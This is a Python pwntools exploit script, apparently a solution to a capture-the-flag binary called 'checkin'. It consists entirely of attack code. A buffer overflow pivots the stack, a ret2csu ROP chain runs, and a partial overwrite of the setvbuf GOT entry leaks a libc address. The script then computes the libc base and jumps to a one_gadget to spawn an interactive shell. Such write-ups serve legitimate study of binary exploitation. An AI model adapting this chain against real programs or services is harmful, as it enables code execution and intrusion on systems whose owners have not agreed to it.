from pwn import *

context.log_level = 'debug'
libc = '/lib/x86_64-linux-gnu/libc.so.6'

p = process('./checkin')
elf = ELF('./checkin')
# #p = remote("node4.buuoj.cn",29509)

context.log_level = "debug"
context.arch = "amd64"

payload = "a"*0xa0 + p64(0x4040c0+0xa0) + p64(0x4011BF)  #buf = 0x4040c0
p.send(payload)

payload = flat([  #csu

    0x404140,    #nouse

    0x40124A,  # pop 6

    0,1,      #rbx rbp

    0x404040, # stdout  r12

    0,0,    # r13 r14

    0x404020,  #r15 setvbuf_got

    0x401230,  # ret 

    0,0,   #+8 rbx

    0x404140, #rbp

    0,0,0,0, #12 13 14 15

    0x4011BF #read = put

    ])

payload = payload.ljust(0xa0,"\x00") + p64(0x404020+0xa0) + p64(0x4011bf) #read 

p.send(payload)

sleep(0.1)

p.send("\x50\xc4")

sleep(0.1)

libc_base = u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00")) -0x1ed6a0

success("libc_base:"+hex(libc_base))

p.send(b"a"*0xa0 +p64(libc_base+0xe3b2e)+p64(libc_base+0xe3b2e) ) 

p.interactive()